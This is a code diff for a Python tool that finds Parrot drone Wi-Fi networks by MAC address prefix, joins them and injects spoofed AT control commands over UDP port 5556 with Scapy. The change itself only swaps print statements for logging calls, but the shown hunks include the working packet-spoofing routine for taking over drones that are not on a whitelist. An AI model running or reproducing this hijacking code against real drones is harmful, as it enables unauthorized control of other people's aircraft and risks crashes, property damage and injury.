@@ -32,7 +32,7 @@ def startArduino():
 		serialDev = "/dev/ttyACM" + str(i)
 		i += 1
 	if not os.path.exists(serialDev):
-		print "ERROR - could not find Arduino connected. Going to 'Moderate' mode"
+		logging.error("ERROR - could not find Arduino connected. Going to 'Moderate' mode")
 		ser = None
 	else:
 		ser = serial.Serial(serialDev, 9600)
@@ -68,7 +68,7 @@ def scanForParrots(interface, whitelist, underattack):
 	for ap in aps:
 		if ap.address.startswith('90:03:B7') or ap.address.startswith('00:26:7E') or ap.address.startswith('A0:14:3D') or ap.address.startswith('00:12:1C') or ap.address.startswith('58:44:98:13:80'): #if it is a parrot OR my phone (for testing)
 			if ap.address not in whitelist and ap.address not in underattack: #only add if new and not on the whitelist
-				print "New parrot wifi found:", ap.ssid
+				logging.info("New parrot wifi found:", ap.ssid)
 				arduinoLCD("New drone: " + ap.ssid)
 				parrots.append(ap)
 	return parrots
@@ -80,7 +80,7 @@ def connectTo(ap, interface):
 		scheme.save()
 		scheme.activate() #connect to the Parrot's wifi
 	except Exception as detail:
-		print "Error while trying to connect to wifi in function connectTo - ", detail
+		logging.error("Error while trying to connect to wifi in function connectTo - ", detail)
 		return False
 	#reset global variables for sniffing
 	global srcMAC, dstMAC, srcIP, dstIP, seqNr
@@ -160,10 +160,10 @@ def sendSpoofedParrotPacket(command, interface, srcMAC, dstMAC, srcIP, dstIP, se
 		part2 = "0,0,0,0,0,0,0"
 		seqNr = -1000000 #so it will be 1 in the end
 		count = 1
-	
+
 	for i in range(1, count+1):
 		payload = "AT*" + part1 + "=" + str(seqNr+i+1000000) + "," + part2 + "\r"
-		print payload
+		logging.debug(payload)
 		spoofed_packet = Ether(src=srcMAC, dst=dstMAC) / IP(src=srcIP, dst=dstIP) / UDP(sport=5556, dport=5556) / payload
 		sendp(spoofed_packet, iface=interface)
 		sleep(0.3)
